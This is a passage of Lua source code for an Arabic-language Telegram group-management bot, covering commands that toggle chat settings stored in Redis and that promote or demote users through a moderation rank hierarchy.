Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:mediaAude")  
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل all' and Creator(msg) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:all") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:all")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل all' and Creator(msg) then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:all") then
redis:set(bot_id..":"..msg.chat_id..":settings:all",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if BasicConstructor(msg) then
if text == 'تفعيل الرفع' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:up")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الرفع' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:up") then
redis:set(bot_id..":"..msg.chat_id..":settings:up",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الكتم' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:ktm")  
else
Text = Reply_Status(msg.sender.user_id,"*•↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الكتم' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:ktm") then
redis:set(bot_id..":"..msg.chat_id..":settings:ktm",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الحظر' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:bn")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الحظر' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:bn") then
redis:set(bot_id..":"..msg.chat_id..":settings:bn",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الطرد' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:kik")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الطرد' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
redis:set(bot_id..":"..msg.chat_id..":settings:kik",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
end
--
if Owner(msg) then
if text and text:match("^وضع عدد المسح (.*)$") then
local Teext = text:match("^وضع عدد المسح (.*)$") 
if Teext and Teext:match('%d+') then
t = "*↯︙تم تعيين  ( "..Teext.." ) كعدد للمسح التلقائي*"
redis:set(bot_id..":mediaAude:utdl"..msg.chat_id,Teext)
else
t = "↯︙عذرا يجب كتابه ( وضع عدد المسح + رقم )"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)
end
if text == ("عدد الميديا") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙عدد الميديا ↦ "..redis:scard(bot_id..":"..msg.chat_id..":mediaAude:ids").."*").yu,"md",true)
end
--
if text == 'تفعيل اطردني' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:kickme")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل اطردني' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
redis:set(bot_id..":"..msg.chat_id..":settings:kickme",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل المميزات' then   
if redis:get(bot_id..":"..msg.chat_id..":Features") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":Features")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل المميزات' then  
if not redis:get(bot_id..":"..msg.chat_id..":Features") then
redis:set(bot_id..":"..msg.chat_id..":Features",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل صورتي' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:phme") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:phme")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل صورتي' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:phme") then
redis:set(bot_id..":"..msg.chat_id..":settings:phme",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل البايو' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:GetBio")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل البايو' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:GetBio") then
redis:set(bot_id..":"..msg.chat_id..":settings:GetBio",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
--
if text == 'تفعيل الرابط' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:link") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:link")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الرابط' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:link") then
redis:set(bot_id..":"..msg.chat_id..":settings:link",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الترحيب' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Welcome") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:Welcome")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الترحيب' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:Welcome") then
redis:set(bot_id..":"..msg.chat_id..":settings:Welcome",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل التنظيف' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:delmsg")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل التنظيف' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
redis:set(bot_id..":"..msg.chat_id..":settings:delmsg",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الايدي' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:id") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:id")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الايدي' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:id") then
redis:set(bot_id..":"..msg.chat_id..":settings:id",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الايدي بالصوره' and BasicConstructor(msg) then     
if redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:id:ph")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الايدي بالصوره' and BasicConstructor(msg) then    
if not redis:get(bot_id..":"..msg.chat_id..":settings:id:ph") then
redis:set(bot_id..":"..msg.chat_id..":settings:id:ph",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الردود' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:Reply")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الردود' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
redis:set(bot_id..":"..msg.chat_id..":settings:Reply",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل الالعاب المتطوره' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:gameVip")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل الالعاب المتطوره' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:gameVip") then
redis:set(bot_id..":"..msg.chat_id..":settings:gameVip",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تفعيل اوامر التسليه' then   
if redis:get(bot_id..":"..msg.chat_id..":settings:entertainment") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:del(bot_id..":"..msg.chat_id..":settings:entertainment")  
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل اوامر التسليه' then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:entertainment") then
redis:set(bot_id..":"..msg.chat_id..":settings:entertainment",true)  
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if text and text:match('^تنزيل الكل (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^تنزيل الكل (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if Get_Rank(UserName,msg.chat_id)== "عضو" then
tt = "↯︙ماله رتبة"
else
tt = "↯︙تم تنزيله من جميع الرتب"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",UserName)
redis:srem(bot_id..":Status:developer",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserName)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserName)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,UserName).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"*"..tt.."*").helo,"md",true)  
return false
end
if text and text:match('^تنزيل الكل @(%S+)$') then
local UserName = text:match('^تنزيل الكل @(%S+)$') 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if Get_Rank(UserId_Info.id,msg.chat_id)== "عضو" then
tt = "↯︙ماله رتبة"
else
tt = "↯︙تم تم تنزيله من الرتبه التاليه  كل الرتب"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",UserId_Info.id)
redis:srem(bot_id..":Status:developer",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",UserId_Info.id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",UserId_Info.id)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,UserId_Info.id).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*"..tt.."*").helo,"md",true)  
return false
end
if text == "تنزيل الكل" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if Get_Rank(Remsg.sender.user_id,msg.chat_id)== "عضو" then
tt = "↯︙ماله رتبة"
else
tt = "↯︙تم تنزيل من جميع الرتب"
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..":Status:programmer",Remsg.sender.user_id)
redis:srem(bot_id..":Status:developer",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif programmer(msg) then
redis:srem(bot_id..":Status:developer",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif developer(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Creator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Creator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:BasicConstructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif BasicConstructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Constructor",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Constructor(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Owner",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Owner(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Administrator",Remsg.sender.user_id)
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Administrator(msg) then
redis:srem(bot_id..":"..msg.chat_id..":Status:Vips",Remsg.sender.user_id)
elseif Vips(msg) then
return false
else
return false
end
if bot.getChatMember(msg.chat_id,Remsg.sender.user_id).status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*"..tt.."*").helo,"md",true)  
return false
end
if text and text:match('^رفع (.*) (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local Usertext = {text:match('^رفع (.*) (%d+)$')}
local TextMsg = Usertext[1]
local UserName = Usertext[2]
if msg.content.text then 
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:up") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• الرفع معطل من قبل المنشئين الاساسيين .*").yu,"md",true)  
return false
end
end
if redis:sismember(bot_id..srt1.."Status:"..srt,UserName) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,"* ↯︙تم ترقيته "..TextMsg.." من قبل*").helo,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'مالك' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ اساسي' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'ادمن' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مميز' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:sadd(bot_id..srt1.."Status:"..srt,UserName)
elseif TextMsg == 'مدير' then
